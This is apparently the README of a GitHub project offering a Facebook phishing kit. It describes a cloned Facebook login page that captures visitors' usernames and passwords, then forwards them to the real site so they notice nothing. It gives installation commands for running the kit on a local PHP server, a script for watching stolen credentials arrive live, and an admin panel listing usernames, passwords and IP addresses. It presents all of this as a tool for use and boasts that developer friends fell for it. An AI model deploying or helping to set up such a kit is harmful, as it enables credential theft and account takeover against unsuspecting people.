## My anonymous friend's comment: üí≠
*This login page is so well-crafted that even Mark Zuckerberg himself might be fooled. The design is flawless, the user experience is seamless, and the security measures are top-notch that It has no connections link with Facebook, So when you use, you feel like **anonymous hacker** !. It's like the perfect replica, so identical to the real thing that even the creator of Facebook would have a hard time telling the difference.*

### How Admin Pannel looks like? ‚úÖ Update 16th March, 2024
![Screenshot from 2024-03-16 04-29-54](https://github.com/isaka-james/fb-phish/assets/76619967/8f971b8d-cb42-47bd-9a40-67601332f4d5)



## HOW IT WORKS? ‚ö°
When user fills his/her username and passwords, by clicking the login. The user will be redirected to official FaceBook website. The user won't notice the changes since the websites(*one which we made and the original one*) are very identical, when I say Identical I mean it!, even my closest developers friends fell for this LOL.


## Installation in linux enviroment üêß

To install this tool,

```bash
  git clone https://github.com/isaka-james/fb-phish.git           # get a copy of Tool
  cd fb-phish                                                     # get inside the Tool
  php -S localhost:8080                                           # start server at port 8080
```
After starting the server, open another session:

I chose the port *8080* for easy understanding(*since Termux users cannot use port 80*)

Then for seeing the users' passwords and usernames filled the form, you can write these commands:
```bash
cd command-line/   # going to 'command-line' folder special made for Linux users
bash command.sh       # this script contains the code for autoreload the live filled username and passwords on the website(tool)
```

## Admin Pannel:
When you want to view the user logins( *username and password* ) through web interface, On the bottom of the login page there is a little box when you clicked that you will be redirected to the */admin* , where you will meet the table with all the user logins.

Or simply navigate to *http://localhost:8080/admin* for viewing the admin pannel containing the username, passwords, IP address and more.
